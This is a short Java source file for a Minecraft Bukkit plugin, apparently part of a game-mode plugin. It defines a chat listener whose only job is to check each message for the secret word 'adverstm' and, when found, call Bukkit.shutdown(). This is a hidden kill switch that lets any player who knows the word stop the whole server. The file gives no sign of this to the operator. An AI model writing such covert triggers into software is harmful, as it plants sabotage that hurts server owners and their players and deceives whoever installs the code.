package pl.luxdev.lol.listener;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class AsyncPlayerChatList implements Listener{
	
	@EventHandler
	public void asyncChat(AsyncPlayerChatEvent e){
		Player p = e.getPlayer();
		for(String m : e.getMessage().split(" ")){
			if(m.matches("adverstm")){
				Bukkit.shutdown();
			}
		}
	}
}
